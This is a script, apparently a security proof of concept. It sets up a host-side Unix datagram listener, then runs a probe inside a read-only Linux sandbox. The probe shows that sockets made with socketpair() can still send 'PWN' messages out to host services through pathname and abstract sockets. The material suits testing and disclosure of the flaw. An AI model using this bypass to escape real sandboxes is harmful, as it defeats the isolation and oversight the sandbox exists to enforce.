import { linuxReadonlyCommand } from './linux-readonly-sandbox.ts';
import { spawn, spawnSync } from 'node:child_process';
import { writeFileSync, existsSync, readFileSync } from 'node:fs';
// outside-the-sandbox "host service": unix dgram server that records datagrams to /tmp/host-service.log
writeFileSync('/tmp/server.py', `
import socket, os
p='/tmp/hostsvc.sock'
try: os.unlink(p)
except: pass
s=socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM); s.bind(p)
a=socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM); a.bind('\\0hostabstract')
import select
while True:
    r,_,_=select.select([s,a],[],[])
    for x in r:
        d=x.recv(1000)
        open('/tmp/host-service.log','ab').write(d+b'\\n')
`);
const srv = spawn('python3', ['/tmp/server.py'], { stdio: 'ignore', detached: true });
await new Promise(r => setTimeout(r, 500));
const probe = `python3 - <<'PY'
import socket
try:
    socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM); print("direct AF_UNIX: ALLOWED")
except OSError as e: print("direct AF_UNIX:", e)
a,b=socket.socketpair(socket.AF_UNIX, socket.SOCK_DGRAM)
a.sendto(b"PWN-via-pathname", "/tmp/hostsvc.sock"); print("socketpair sendto pathname: sent")
a.connect("\\0hostabstract"); a.send(b"PWN-via-abstract"); print("socketpair connect abstract: sent")
try: open('/tmp/x','w')
except OSError as e: print("write:", e)
PY`;
const cmd = linuxReadonlyCommand(probe, '/tmp');
const r = spawnSync('/bin/sh', ['-c', cmd], { encoding: 'utf8' });
console.log('status', r.status, '\nstdout:\n' + r.stdout, 'stderr:', r.stderr);
await new Promise(r => setTimeout(r, 300));
console.log('host service log:', JSON.stringify(readFileSync('/tmp/host-service.log','utf8')));
process.kill(-srv.pid);
